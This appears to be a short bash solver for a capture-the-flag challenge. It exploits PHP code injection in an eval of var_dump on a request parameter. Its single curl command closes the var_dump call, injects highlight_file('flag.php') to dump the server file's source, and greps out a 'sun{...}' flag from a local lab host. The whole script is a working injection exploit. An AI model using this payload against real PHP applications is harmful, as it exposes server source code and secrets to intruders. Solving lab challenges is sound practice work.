#!/bin/bash
# eval("var_dump($a)") with $a = $_REQUEST['hello'] is a PHP code injection.
# Close var_dump, read flag.php (flag is in its source comment), reopen.
HOST="${URL:-${1:-http://127.0.0.1:18301}}"
curl -s "$HOST/?hello=1);highlight_file('flag.php');var_dump(1" | grep -o 'sun{[^}]*}' | head -1
